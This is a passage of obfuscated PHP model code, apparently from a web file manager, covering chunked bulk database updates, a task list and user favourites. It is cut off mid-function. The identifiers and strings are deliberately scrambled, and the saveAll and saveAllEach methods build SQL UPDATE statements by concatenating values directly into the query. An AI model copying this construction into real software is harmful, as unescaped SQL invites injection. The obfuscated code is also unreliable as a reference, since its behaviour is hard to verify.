unset($AâòÚ–ŠŒ[$e ²øèÏê]); } break; case $DÉÒ«ØĞç…[323]: $AâòÚ–ŠŒ[$e ²øèÏê] = $A¤ŠÀÍ¦[1]; default: break; } } if ($BÍ“Õİ«ğÆ == $DÉÒ«ØĞç…[355]) { $c¨Á¥•ê„ = strtolower($this->db->getDbType()); if (strpos($c¨Á¥•ê„, $DÉÒ«ØĞç…[19]) !== 0) { return; } $f—Ò°ª¥ = $this->field(!0)->fields; $a¼½ç¦†÷Ì = $f—Ò°ª¥[$DÉÒ«ØĞç…[251]]; if (isset($f—Ò°ª¥[$DÉÒ«ØĞç…[250]])) { unset($a¼½ç¦†÷Ì[$f—Ò°ª¥[$DÉÒ«ØĞç…[250]]]); } foreach ($a¼½ç¦†÷Ì as $bôÅºĞ›‚ => $BÍ“Õİ«ğÆ) { if (!isset($AâòÚ–ŠŒ[$bôÅºĞ›‚])) { $AâòÚ–ŠŒ[$bôÅºĞ›‚] = $DÉÒ«ØĞç…[43]; } } } } private function dataAfterFilter(&$F¸é¶ò–ˆÊ) { $B²””•Ï„ª =& $_SERVER[¹÷ˆ§éÒ°ú]; foreach ($this->dataAuto as $e·À§„Öì) { $dŒ°¡¥–£Â = $e·À§„Öì[0]; if (!in_array($B²””•Ï„ª[357], explode($B²””•Ï„ª[57], $e·À§„Öì[2]))) { continue; } if (!isset($F¸é¶ò–ˆÊ[$dŒ°¡¥–£Â])) { continue; } switch (trim($e·À§„Öì[3])) { case $B²””•Ï„ª[320]: case $B²””•Ï„ª[321]: $B‡ÄÍ½Ò¸Å = isset($e·À§„Öì[4]) ? (array) $e·À§„Öì[4] : array(); array_unshift($B‡ÄÍ½Ò¸Å, $F¸é¶ò–ˆÊ[$dŒ°¡¥–£Â]); if ($B²””•Ï„ª[320] == $e·À§„Öì[3]) { $F¸é¶ò–ˆÊ[$dŒ°¡¥–£Â] = call_user_func_array($e·À§„Öì[1], $B‡ÄÍ½Ò¸Å); } else { $F¸é¶ò–ˆÊ[$dŒ°¡¥–£Â] = call_user_func_array(array(&$this, $e·À§„Öì[1]), $B‡ÄÍ½Ò¸Å); } break; case $B²””•Ï„ª[272]: $F¸é¶ò–ˆÊ[$dŒ°¡¥–£Â] = $F¸é¶ò–ˆÊ[$e·À§„Öì[1]]; break; case $B²””•Ï„ª[293]: $d¥ùÒËƒâ = $F¸é¶ò–ˆÊ[$dŒ°¡¥–£Â]; $F¸é¶ò–ˆÊ[$dŒ°¡¥–£Â] = json_decode($d¥ùÒËƒâ, !0); if (is_null($F¸é¶ò–ˆÊ[$dŒ°¡¥–£Â])) { $F¸é¶ò–ˆÊ[$dŒ°¡¥–£Â] = $d¥ùÒËƒâ; } break; case $B²””•Ï„ª[322]: if ($F¸é¶ò–ˆÊ[$dŒ°¡¥–£Â] === $B²””•Ï„ª[43]) { unset($F¸é¶ò–ˆÊ[$dŒ°¡¥–£Â]); } break; case $B²””•Ï„ª[323]: $F¸é¶ò–ˆÊ[$dŒ°¡¥–£Â] = $e·À§„Öì[1]; default: break; } } } public function saveAll($bœÚµ§¦í) { goto B÷Ñ–Ÿ÷ÀÛ; fÕê—´ç¶°: $F¡¼ĞÖ¦èë = array(); $DŠĞİàø¤Í = count($bœÚµ§¦í); for ($eŒÌŞ¦‡ŞÀ = 0; $eŒÌŞ¦‡ŞÀ < $DŠĞİàø¤Í; $eŒÌŞ¦‡ŞÀ++) { $c¢¥É¿ºÛ‰ = $bœÚµ§¦í[$eŒÌŞ¦‡ŞÀ]; if (!is_array($c¢¥É¿ºÛ‰) || count($c¢¥É¿ºÛ‰) != 4) { continue; } $fÃÄ—ÔÙç = "\125\120\x44\x41\x54\x45\40\140{$C†¶­òì}\x60\x20\x53\x45\124\x20{$c¢¥É¿ºÛ‰[2]}\x20\75\40\103\101\x53\105\x20{$c¢¥É¿ºÛ‰[0]}\x20\xa"; if ($bÆ—‘ßá¯˜ == 0) { $dÔëŸµ¸ = $fÃÄ—ÔÙç; } $F¡¼ĞÖ¦èë[] = $bÕÈ‹ˆ¤…ä[125] . $c¢¥É¿ºÛ‰[1] . $bÕÈ‹ˆ¤…ä[125]; $bÆ—‘ßá¯˜++; $dÔëŸµ¸ .= "\40\x57\x48\105\x4e\40\x27{$c¢¥É¿ºÛ‰[1]}\x27\40\x54\x48\105\x4e\40\47{$c¢¥É¿ºÛ‰[3]}\47\x20\12"; if ($bÆ—‘ßá¯˜ == $Dô¥ÀÇáø || $eŒÌŞ¦‡ŞÀ == $DŠĞİàø¤Í - 1) { goto B‚™‹ñ—ˆô; b•ÊÉí¢‹Ò: $bÆ—‘ßá¯˜ = 0; $dÔëŸµ¸ = $fÃÄ—ÔÙç; $this->chunkEventCheck(count($F¡¼ĞÖ¦èë)); goto e…Òµ‡Ùˆö; e…Òµ‡Ùˆö: $F¡¼ĞÖ¦èë = array(); goto B¡Áòê”£; B‚™‹ñ—ˆô: $AÍ´–ãŠïĞ = implode($bÕÈ‹ˆ¤…ä[57], $F¡¼ĞÖ¦èë); $dÔëŸµ¸ .= "\40\105\116\104\x20\40\x57\110\x45\x52\105\40{$c¢¥É¿ºÛ‰[0]}\40\111\x4e\40\50{$AÍ´–ãŠïĞ}\51\40"; $this->execute($dÔëŸµ¸); goto b•ÊÉí¢‹Ò; B¡Áòê”£: } } goto dåÔš‰§÷; aŸİÚÌ¼À¹: $bœÚµ§¦í = is_array($bœÚµ§¦í) ? $bœÚµ§¦í : array(); $dÔëŸµ¸ = $bÕÈ‹ˆ¤…ä[372]; $bÆ—‘ßá¯˜ = 0; goto fÕê—´ç¶°; B÷Ñ–Ÿ÷ÀÛ: $bÕÈ‹ˆ¤…ä =& $_SERVER[¹÷ˆ§éÒ°ú]; $C†¶­òì = $this->tablePrefix . $this->tableName; $Dô¥ÀÇáø = self::SQL_WHERE_IN_CHUNK; goto aŸİÚÌ¼À¹; dåÔš‰§÷: $this->chunkEventSet(); goto AÖ„ø“˜Î¿; AÖ„ø“˜Î¿: } public function saveAllEach($bÓƒƒŒ®ŠÂ) { $BƒŠŒØ‚Ë¾ =& $_SERVER[¹÷ˆ§éÒ°ú]; $cçÊŞ†ÀÓ‘ = $this->tablePrefix . $this->tableName; foreach ($bÓƒƒŒ®ŠÂ as $DÙŒİ¨ø¬”) { if (!is_array($DÙŒİ¨ø¬”) || count($DÙŒİ¨ø¬”) != 4) { continue; } $DãŸù»¤¯ß = $DÙŒİ¨ø¬”[0] . $BƒŠŒØ‚Ë¾[373] . $DÙŒİ¨ø¬”[1] . $BƒŠŒØ‚Ë¾[125]; $B”éºÙ®»§ = $DÙŒİ¨ø¬”[2] . $BƒŠŒØ‚Ë¾[373] . $DÙŒİ¨ø¬”[3] . $BƒŠŒØ‚Ë¾[125]; $a¾å‚÷÷ = "\x75\x70\144\x61\x74\145\x20{$cçÊŞ†ÀÓ‘}\x20\x73\x65\x74\40{$B”éºÙ®»§}\40\x77\150\x65\x72\x65\40{$DãŸù»¤¯ß}\x3b"; $this->execute($a¾å‚÷÷); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($fì“ô³‹£ = false, $FäÂ»ö“‡™ = false) { $this->_chunkEvent = $fì“ô³‹£; $this->_chunkEventParam = $FäÂ»ö“‡™; } private function chunkEventCheck($DË¨Ê“Ã¼‚) { if (!$this->_chunkEvent) { return; } $EÍ˜­¸·Î¾ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $EÍ˜­¸·Î¾[$_SERVER[¹÷ˆ§éÒ°ú][374]] = $DË¨Ê“Ã¼‚; Hook::trigger($this->_chunkEvent, $EÍ˜­¸·Î¾); } public function addAll($cÓ°¾“Ô‹é, $a”ÛË²¯Ä = array(), $Aâ˜ÖÖŞŒ = false) { goto Aç‡µĞ£Ñ­; dÛë¸‡×¨ˆ: if (method_exists($this->db, $c¾œôÂá…[271])) { for ($c¸Å—¬¼‡› = 0; $c¸Å—¬¼‡› < count($cÓ°¾“Ô‹é); $c¸Å—¬¼‡› += $E²ÚÇ•‘ÒŸ) { $Eóé¶•¥ = array_slice($cÓ°¾“Ô‹é, $c¸Å—¬¼‡›, $E²ÚÇ•‘ÒŸ); if (!is_array($Eóé¶•¥) || count($Eóé¶•¥) == 0) { break; } $AÙÅËƒÉ‰ = $this->db->insertAll($Eóé¶•¥, $a”ÛË²¯Ä, $Aâ˜ÖÖŞŒ); $this->chunkEventCheck(count($Eóé¶•¥)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($cÓ°¾“Ô‹é as $BŠ¥ÚÊ¯ô => $E®®÷šóƒÛ) { $AÙÅËƒÉ‰ = $this->db->insert($E®®÷šóƒÛ, $a”ÛË²¯Ä, $Aâ˜ÖÖŞŒ); } $this->commit(); } if (!1 !== $AÙÅËƒÉ‰) { $f‘â¿¹·ŠØ = $this->getLastInsID(); if ($f‘â¿¹·ŠØ) { return $f‘â¿¹·ŠØ; } } return $AÙÅËƒÉ‰; goto Eòš¬Ãã; AÉá‘Ç¤îŞ: if (empty($cÓ°¾“Ô‹é)) { $this->error = think_lang($c¾œôÂá…[270]); return !1; } $a”ÛË²¯Ä = $this->_parseOptions($a”ÛË²¯Ä); foreach ($cÓ°¾“Ô‹é as $BŠ¥ÚÊ¯ô => $E®®÷šóƒÛ) { $cÓ°¾“Ô‹é[$BŠ¥ÚÊ¯ô] = $this->_facade($E®®÷šóƒÛ); $this->_beforeInsert($cÓ°¾“Ô‹é[$BŠ¥ÚÊ¯ô], $a”ÛË²¯Ä); } goto dÛë¸‡×¨ˆ; Aç‡µĞ£Ñ­: $c¾œôÂá… =& $_SERVER[¹÷ˆ§éÒ°ú]; ignore_timeout(); $E²ÚÇ•‘ÒŸ = self::SQL_WHERE_IN_CHUNK; goto AÉá‘Ç¤îŞ; Eòš¬Ãã: } public function save($aÔ¢¤Æ‚áë = '', $FóÓâ®‚À = array()) { goto E”í”õõøé; eõÆ«Óùßë: $Aí»¾Á„Ëª = $this->findWhereField($e‰Ñô¡•É); if (!$Aí»¾Á„Ëª) { return parent::save($aÔ¢¤Æ‚áë, $FóÓâ®‚À); } $a¸÷²Œ½ = 0; goto E¢ÕéĞÕ; E”í”õõøé: $AçÆ—ÚµÖ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Dñ•‚Õè¹Ñ = self::SQL_WHERE_IN_CHUNK; $e‰Ñô¡•É = $this->optionsValue(); goto eõÆ«Óùßë; E¢ÕéĞÕ: $B¯Ú‚ß•¯ = $e‰Ñô¡•É[$AçÆ—ÚµÖ[274]][$Aí»¾Á„Ëª][1]; $B¯Ú‚ß•¯ = is_array($B¯Ú‚ß•¯) ? $B¯Ú‚ß•¯ : array(); $DæÇòÈää = count($B¯Ú‚ß•¯); goto A¸ÈÛ–Å¥; A¸ÈÛ–Å¥: for ($Dç§òŞ”‘ = 0; $Dç§òŞ”‘ < $DæÇòÈää; $Dç§òŞ”‘ += $Dñ•‚Õè¹Ñ) { $CŒÙ»­¼» = array_slice($B¯Ú‚ß•¯, $Dç§òŞ”‘, $Dñ•‚Õè¹Ñ); if (!is_array($CŒÙ»­¼») || count($CŒÙ»­¼») == 0) { break; } $e‰Ñô¡•É[$AçÆ—ÚµÖ[274]][$Aí»¾Á„Ëª][1] = $CŒÙ»­¼»; $this->optionsValue($e‰Ñô¡•É); $a¸÷²Œ½ += parent::save($aÔ¢¤Æ‚áë, $FóÓâ®‚À); $this->chunkEventCheck(count($CŒÙ»­¼»)); } $this->chunkEventSet(); return $a¸÷²Œ½; goto e‰ò…ìé‰ò; e‰ò…ìé‰ò: } public function add($d­ß²ø°åõ = '', $DöæŒö÷« = array(), $b¹©®ê˜¢š = false) { if ($this->addTaskStatus && is_array($d­ß²ø°åõ)) { $this->addTaskData[] = $d­ß²ø°åõ; return; } return parent::add($d­ß²ø°åõ, $DöæŒö÷«, $b¹©®ê˜¢š); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($B”±°É‚´´ = array()) { goto F‚Ä¾âÌÅ ; F‚Ä¾âÌÅ : $fñÊ‡ŠÓ =& $_SERVER[¹÷ˆ§éÒ°ú]; $F»ïŠ—ÉÖô = self::SQL_WHERE_IN_CHUNK; $c®éÂ“¿ì¥ = $this->optionsValue(); goto c·Ù©Ú©¢Ñ; A±Àé¸„¶Œ: $EõÃÃã• = is_array($EõÃÃã•) ? $EõÃÃã• : array(); $D£©Û×˜§ = null; for ($EÉõ…ÊÌÛŠ = 0; $EÉõ…ÊÌÛŠ < count($EõÃÃã•); $EÉõ…ÊÌÛŠ += $F»ïŠ—ÉÖô) { $f´Æä–•Àß = array_slice($EõÃÃã•, $EÉõ…ÊÌÛŠ, $F»ïŠ—ÉÖô); if (!is_array($f´Æä–•Àß) || count($f´Æä–•Àß) == 0) { break; } $c®éÂ“¿ì¥[$fñÊ‡ŠÓ[274]][$aó‰£µî“î][1] = $f´Æä–•Àß; $this->optionsValue($c®éÂ“¿ì¥); $DÂ¼İÌìø© = parent::select($B”±°É‚´´); if (!$DÂ¼İÌìø©) { continue; } if (is_null($D£©Û×˜§)) { $D£©Û×˜§ = array(); } $D£©Û×˜§ = array_merge($D£©Û×˜§, $DÂ¼İÌìø©); } goto fÄÁ™ÙÄ­; fÄÁ™ÙÄ­: return $D£©Û×˜§; goto FÀ´‚‹óØ; c·Ù©Ú©¢Ñ: $aó‰£µî“î = $this->findWhereField($c®éÂ“¿ì¥); if (!$aó‰£µî“î || isset($c®éÂ“¿ì¥[$fñÊ‡ŠÓ[291]]) || isset($c®éÂ“¿ì¥[$fñÊ‡ŠÓ[351]])) { return parent::select($B”±°É‚´´); } $EõÃÃã• = $c®éÂ“¿ì¥[$fñÊ‡ŠÓ[274]][$aó‰£µî“î][1]; goto A±Àé¸„¶Œ; FÀ´‚‹óØ: } public function delete($d×˜¶£ÛÇÂ = array()) { goto E‹’½’™­¿; f£‘Ü»‡¥º: return $Dç¼Õ˜Åœ; goto a×¸óùÅŒˆ; F­Š½ÅÂÑÒ: $AâÅÁ¤Àòç = $Aè¯„ä¼é[$eÊè—é †Ï[274]][$Fîµ„¦©Á’][1]; $AâÅÁ¤Àòç = is_array($AâÅÁ¤Àòç) ? $AâÅÁ¤Àòç : array(); for ($c³öË›ĞÍ§ = 0; $c³öË›ĞÍ§ < count($AâÅÁ¤Àòç); $c³öË›ĞÍ§ += $fÏ¡¢·ÒÏ“) { $e×²Â¢ñÒ  = array_slice($AâÅÁ¤Àòç, $c³öË›ĞÍ§, $fÏ¡¢·ÒÏ“); if (!is_array($e×²Â¢ñÒ ) || count($e×²Â¢ñÒ ) == 0) { break; } $Aè¯„ä¼é[$eÊè—é †Ï[274]][$Fîµ„¦©Á’][1] = $e×²Â¢ñÒ ; $this->optionsValue($Aè¯„ä¼é); $Dç¼Õ˜Åœ += parent::delete($d×˜¶£ÛÇÂ); } goto f£‘Ü»‡¥º; f’²éá¨Æ: $Fîµ„¦©Á’ = $this->findWhereField($Aè¯„ä¼é); if (!$Fîµ„¦©Á’) { return parent::delete($d×˜¶£ÛÇÂ); } $Dç¼Õ˜Åœ = 0; goto F­Š½ÅÂÑÒ; E‹’½’™­¿: $eÊè—é †Ï =& $_SERVER[¹÷ˆ§éÒ°ú]; $fÏ¡¢·ÒÏ“ = self::SQL_WHERE_IN_CHUNK; $Aè¯„ä¼é = $this->optionsValue(); goto f’²éá¨Æ; a×¸óùÅŒˆ: } private function findWhereField($A»„ó·ÄÒ) { $D‘±ÙøŒ½é =& $_SERVER[¹÷ˆ§éÒ°ú]; $dĞ§î¨Òğõ = self::SQL_WHERE_IN_CHUNK; if (!is_array($A»„ó·ÄÒ) || !is_array($A»„ó·ÄÒ[$D‘±ÙøŒ½é[274]])) { return !1; } foreach ($A»„ó·ÄÒ[$D‘±ÙøŒ½é[274]] as $D¤™‘èÄ’ˆ => $b…éìÌº•ä) { if (is_array($b…éìÌº•ä) && isset($b…éìÌº•ä[0]) && is_string($b…éìÌº•ä[0]) && strtolower($b…éìÌº•ä[0]) == $D‘±ÙøŒ½é[17] && is_array($b…éìÌº•ä[1]) && count($b…éìÌº•ä[1]) > $dĞ§î¨Òğõ) { ignore_timeout(); return $D¤™‘èÄ’ˆ; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\x74\145\x6d\x4f\x70\164\151\x6f\156"; public $field = array(); public function listData($CÏÕ‰Ö æ = false, $D¾›˜ ƒ¸ = "\x6d\157\x64\151\146\x79\124\151\155\x65", $a¬æÊÀï¿õ = false) { $d…Ìâ Œî§ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$d…Ìâ Œî§) { return $CÏÕ‰Ö æ ? null : array(); } if (!$CÏÕ‰Ö æ) { $d…Ìâ Œî§ = array_filter(array_values($d…Ìâ Œî§)); return array_sort_by($d…Ìâ Œî§, $D¾›˜ ƒ¸, $a¬æÊÀï¿õ); } return $d…Ìâ Œî§[$_SERVER[¹÷ˆ§éÒ°ú][375] . $CÏÕ‰Ö æ]; } public function insert($D¹Âèì“…È) { goto DÛø¯¡·Ìâ; DÛø¯¡·Ìâ: $cï¶˜İà¬ =& $_SERVER[¹÷ˆ§éÒ°ú]; $D¹Âèì“…È = array_field_key($D¹Âèì“…È, $this->field); $c¬ßÓÁ†Ç = Model($this->modelType)->get($cï¶˜İà¬[376], $this->optionType . $cï¶˜İà¬[377]); goto A†Ì»«ÜÒ; A†Ì»«ÜÒ: $c¬ßÓÁ†Ç = $c¬ßÓÁ†Ç ? $c¬ßÓÁ†Ç : 0; $D¹Âèì“…È[$cï¶˜İà¬[378]] = ++$c¬ßÓÁ†Ç; $D¹Âèì“…È[$cï¶˜İà¬[199]] = time(); goto BÈ¤‚‚Œ—†; BÈ¤‚‚Œ—†: $D¹Âèì“…È[$cï¶˜İà¬[119]] = time(); Model($this->modelType)->set($cï¶˜İà¬[376], $c¬ßÓÁ†Ç, $this->optionType . $cï¶˜İà¬[377]); Model($this->modelType)->set($cï¶˜İà¬[375] . $c¬ßÓÁ†Ç, $D¹Âèì“…È, $this->optionType); goto còÒÚ¢íøÙ; còÒÚ¢íøÙ: return $c¬ßÓÁ†Ç; goto cØ§»åİÖå; cØ§»åİÖå: } public function update($D¯ó¦ÌéÔ, $B…‡‡“°—) { goto a»Û—Á¿…‚; b±âÙšĞ‹: return Model($this->modelType)->set($Fëœ•š™ì[375] . $D¯ó¦ÌéÔ, $B…‡‡“°—, $this->optionType); goto D‚è÷ïöß; F£ô‡°ëáö: if (!$bº¼ôİ‚ƒÓ) { return !1; } $B…‡‡“°— = array_merge($bº¼ôİ‚ƒÓ, $B…‡‡“°—); $B…‡‡“°—[$Fëœ•š™ì[119]] = time(); goto b±âÙšĞ‹; a»Û—Á¿…‚: $Fëœ•š™ì =& $_SERVER[¹÷ˆ§éÒ°ú]; $B…‡‡“°— = array_field_key($B…‡‡“°—, $this->field); $bº¼ôİ‚ƒÓ = $this->listData($D¯ó¦ÌéÔ); goto F£ô‡°ëáö; D‚è÷ïöß: } public function remove($fÏÇÃƒùî) { return Model($this->modelType)->remove($_SERVER[¹÷ˆ§éÒ°ú][375] . $fÏÇÃƒùî, $this->optionType); } public function clear() { $Cºø•Éµ•ù =& $_SERVER[¹÷ˆ§éÒ°ú]; Model($this->modelType)->remove($Cºø•Éµ•ù[376], $this->optionType . $Cºø•Éµ•ù[377]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($f¹Üó¨¦ä, $eİô©„Ä÷) { if (!$eİô©„Ä÷) { return !1; } $EÕ·¢“ö ® = $this->listData(); $EÕ·¢“ö ® = array_to_keyvalue($EÕ·¢“ö ®, $f¹Üó¨¦ä); return isset($EÕ·¢“ö ®[$eİô©„Ä÷]) ? $EÕ·¢“ö ®[$eİô©„Ä÷] : !1; } public function findByName($DˆÍÏ¬µ²) { return $this->findByKey($_SERVER[¹÷ˆ§éÒ°ú][38], $DˆÍÏ¬µ²); } protected function resetData($f´âò½®Ø) { $D»“ù¼¥æÙ =& $_SERVER[¹÷ˆ§éÒ°ú]; $f´âò½®Ø = is_array($f´âò½®Ø) ? $f´âò½®Ø : array(); $E¹É‚›£ = array(); for ($Fõé¬£ÒãÌ = 0; $Fõé¬£ÒãÌ < count($f´âò½®Ø); $Fõé¬£ÒãÌ++) { $E¹É‚›£[$D»“ù¼¥æÙ[375] . $f´âò½®Ø[$Fõé¬£ÒãÌ][$D»“ù¼¥æÙ[378]]] = $f´âò½®Ø[$Fõé¬£ÒãÌ]; } return Model($this->modelType)->set($E¹É‚›£, !1, $this->optionType); } private function getAutoName($e‘±øÂ¶áÓ) { $bÁñ§õ´ = array_to_keyvalue($this->listData(), $_SERVER[¹÷ˆ§éÒ°ú][38]); if (!$bÁñ§õ´ || !isset($bÁñ§õ´[$e‘±øÂ¶áÓ])) { return $e‘±øÂ¶áÓ; } for ($FÊßòÃª¸â = 1; $FÊßòÃª¸â < count($bÁñ§õ´); $FÊßòÃª¸â++) { $a¬›³ôŸ‰ = $e‘±øÂ¶áÓ . "\50{$FÊßòÃª¸â}\51"; if (!isset($bÁñ§õ´[$a¬›³ôŸ‰])) { return $a¬›³ôŸ‰; } } return $a¬›³ôŸ‰; } } goto d‘ô¢Ë†çø; ağÑå‘ß¿: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\155\x2e\164\141\163\153\x4c\x69\163\x74"; public $field = array("\156\141\x6d\145", "\164\x79\x70\x65", "\145\x76\145\x6e\164", "\164\151\155\145", "\144\145\163\x63", "\163\171\163\164\145\x6d", "\x65\x6e\x61\x62\x6c\x65", "\x6c\141\x73\x74\122\x75\156", "\163\157\x72\x74"); public function listData($fè£Œä«µ = false, $CÍ“öóñÒ = "\x73\x6f\x72\164", $Bì«÷¹ŒÏ = false) { return parent::listData($fè£Œä«µ, $CÍ“öóñÒ, $Bì«÷¹ŒÏ); } public function add($B§Š‚¾‡Î¤) { $f‡¿Âòœ =& $_SERVER[¹÷ˆ§éÒ°ú]; $A‚ø§†²Á† = $this->findByName($B§Š‚¾‡Î¤[$f‡¿Âòœ[38]]); if ($A‚ø§†²Á†) { return !1; } $B§Š‚¾‡Î¤[$f‡¿Âòœ[1392]] = 0; $B§Š‚¾‡Î¤[$f‡¿Âòœ[2119]] = $this->getSort(); return parent::insert($B§Š‚¾‡Î¤); } private function getSort() { $a¦êØÎ„Û =& $_SERVER[¹÷ˆ§éÒ°ú]; $b¦‘¡éÔ©„ = parent::listData(); $CôÇ¾Š¼Ë¿ = array_to_keyvalue($b¦‘¡éÔ©„, $a¦êØÎ„Û[43], $a¦êØÎ„Û[2119]); return empty($CôÇ¾Š¼Ë¿) ? 0 : max($CôÇ¾Š¼Ë¿) + 1; } public function update($EÆÀ¬¯„â‡, $b¼Ë·ÉŠË) { $d”Ÿ·®‹âÖ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Bß—­ƒ®·¦ = $this->listData($EÆÀ¬¯„â‡); $C“÷Í·­È‰ = $this->findByName($b¼Ë·ÉŠË[$d”Ÿ·®‹âÖ[38]]); if (!$Bß—­ƒ®·¦ || $C“÷Í·­È‰ && $C“÷Í·­È‰[$d”Ÿ·®‹âÖ[378]] != $Bß—­ƒ®·¦[$d”Ÿ·®‹âÖ[378]]) { return !1; } return parent::update($EÆÀ¬¯„â‡, $b¼Ë·ÉŠË); } public function remove($CŠõªš¢®¹, $d†¶¶Í˜ƒà = false) { $c¢Ï‹ÌŠÉÏ =& $_SERVER[¹÷ˆ§éÒ°ú]; $A†ª¶  £Ã = $this->listData($CŠõªš¢®¹); if (!$A†ª¶  £Ã) { return; } if (!$d†¶¶Í˜ƒà && $A†ª¶  £Ã[$c¢Ï‹ÌŠÉÏ[1071]] == $c¢Ï‹ÌŠÉÏ[95]) { return !1; } return parent::remove($CŠõªš¢®¹); } public function enable($C°”œ‚ŠåĞ, $BÎŒÎ«À¼‡) { return $this->update($C°”œ‚ŠåĞ, array($_SERVER[¹÷ˆ§éÒ°ú][2485] => $BÎŒÎ«À¼‡)); } public function run($f§Îí¼ÈâÌ) { return $this->update($f§Îí¼ÈâÌ, array($_SERVER[¹÷ˆ§éÒ°ú][2496] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\x66\141\166"; protected function cacheFunctionAlias($e’¨ µƒÙ­) { $Cë÷ä“‹«Í =& $_SERVER[¹÷ˆ§éÒ°ú]; return array($Cë÷ä“‹«Í[2194] => array(USER_ID, $Cë÷ä“‹«Í[2497])); } protected function listData() { $A²Ğöˆîœí =& $_SERVER[¹÷ˆ§éÒ°ú]; $f¯ØíÉ”Ë = array($A²Ğöˆîœí[1418] => USER_ID, $A²Ğöˆîœí[447] => 0); $Få™÷Üì´… = $A²Ğöˆîœí[2498]; $d±«È‡‡Ç = $this->field($Få™÷Üì´…)->where($f¯ØíÉ”Ë)->order($A²Ğöˆîœí[2499])->select(); return $d±«È‡‡Ç ? $d±«È‡‡Ç : array(); } protected function resetCache() { } protected function listView() { goto A„ª”¾ŒÂ†; c‰ì³Ù…ñ£: $FÑšÃ’éŒµ = array_to_keyvalue($E÷ù¤„—˜, $dÈŠ’Ã’ï’[43], $dÈŠ’Ã’ï’[87]); if (!$FÑšÃ’éŒµ) { return $fòĞ½Àê‡‰; } $D–èíè¶Ü = 2000; goto Dº‡˜íâ•; Dº‡˜íâ•: $dµ‘È¼½šæ = array($dÈŠ’Ã’ï’[394] => array($dÈŠ’Ã’ï’[395], $FÑšÃ’éŒµ)); $A½™Š‡ÉéÁ = Model($dÈŠ’Ã’ï’[747])->listSource($dµ‘È¼½šæ, $D–èíè¶Ü); $A½™Š‡ÉéÁ = array_merge($A½™Š‡ÉéÁ[$dÈŠ’Ã’ï’[85]], $A½™Š‡ÉéÁ[$dÈŠ’Ã’ï’[86]]); goto eƒÙ‘´ÌŠ’; A„ª”¾ŒÂ†: $dÈŠ’Ã’ï’ =& $_SERVER[¹÷ˆ§éÒ°ú]; $fòĞ½Àê‡‰ = $this->listData(); $E÷ù¤„—˜ = array_filter_by_field($fòĞ½Àê‡‰, $dÈŠ’Ã’ï’[39], $dÈŠ’Ã’ï’[393]); goto c‰ì³Ù…ñ£; eƒÙ‘´ÌŠ’: $A½™Š‡ÉéÁ = array_to_keyvalue($A½™Š‡ÉéÁ, $dÈŠ’Ã’ï’[380]); foreach ($fòĞ½Àê‡‰ as $fªÇ‘›Å…ó => $dªšÀ¤—Ã) { $b³Ç«•Ï–ò = $A½™Š‡ÉéÁ[$dªšÀ¤—Ã[$dÈŠ’Ã’ï’[87]]]; $b³Ç«•Ï–ò = $b³Ç«•Ï–ò ? $b³Ç«•Ï–ò : array(); $fòĞ½Àê‡‰[$fªÇ‘›Å…ó] = array_merge($b³Ç«•Ï–ò, $dªšÀ¤—Ã); } return $fòĞ½Àê‡‰; goto eğİ¯‹ÇÙé; eğİ¯‹ÇÙé: } protected function addFav($B’Ïóê½“å, $Fîšà ‚Œ£ = '', $cÎ‡ÆàğÏ¨ = "\163\157\x75\162\x63\145") { goto D™„š¾ïì; D™„š¾ïì: $bÍÕ›ÒŸ«ù =& $_SERVER[¹÷ˆ§éÒ°ú]; $Bø‡Îå¾Í¼ = array($bÍÕ›ÒŸ«ù[1418] => USER_ID, $bÍÕ›ÒŸ«ù[447] => 0, $bÍÕ›ÒŸ«ù[399] => $cÎ‡ÆàğÏ¨, $bÍÕ›ÒŸ«ù[398] => $B’Ïóê½“å); if ($this->where($Bø‡Îå¾Í¼)->find()) { return !1; } goto Cƒ»”ÖÇ‰; aÆ™­°”—¤: return $this->add($bô‘±æë¼); goto D’ëÕå–´; Cƒ»”ÖÇ‰: $Bø‡Îå¾Í¼ = array($bÍÕ›ÒŸ«ù[1418] => USER_ID, $bÍÕ›ÒŸ«ù[447] => 0); $F‘Õ·ŒğÊÙ = $this->where($Bø‡Îå¾Í¼)->max($bÍÕ›ÒŸ«ù[2119]); if (!$F‘Õ·ŒğÊÙ) { $F‘Õ·ŒğÊÙ = 0; } goto d’êïƒ‚èæ; d’êïƒ‚èæ: if (!$Fîšà ‚Œ£ && $cÎ‡ÆàğÏ¨ == $bÍÕ›ÒŸ«ù[393]) { $AŸÕï¤ƒ«å = Model($bÍÕ›ÒŸ«ù[1108])->where(array($bÍÕ›ÒŸ«ù[394] => $B’Ïóê½“å))->find(); if (!$AŸÕï¤ƒ«å) { return !1; } $Fîšà ‚Œ£ = $AŸÕï¤ƒ«å[$bÍÕ›ÒŸ«ù[38]]; } $Fîšà ‚Œ£ = $this->getAutoName($Fîšà ‚Œ£); $bô‘±æë¼ = array($bÍÕ›ÒŸ«ù[1418] => USER_ID, $bÍÕ›ÒŸ«ù[447] => 0, $bÍÕ›ÒŸ«ù[397] => $Fîšà ‚Œ£, $bÍÕ›ÒŸ«ù[398] => $B’Ïóê½“å, $bÍÕ›ÒŸ«ù[399] => $cÎ‡ÆàğÏ¨, $bÍÕ›ÒŸ«ù[2102] => $F‘Õ·ŒğÊÙ + 1); goto aÆ™­°”—¤; D’ëÕå–´: } protected function remove($bšó»°†¨Œ) { $Dìîé›º—ì =& $_SERVER[¹÷ˆ§éÒ°ú]; $eœ– …¹• = array($Dìîé›º—ì[1418] => USER_ID, $Dìîé›º—ì[396] => $bšó»°†¨Œ); return $this->where($eœ– …¹•)->delete(); } protected function removeByName($bËåÚ‰Ñ) { $c‹íŒåÕ†Ğ =& $_SERVER[¹÷ˆ§éÒ°ú]; $EÇ’×é… = 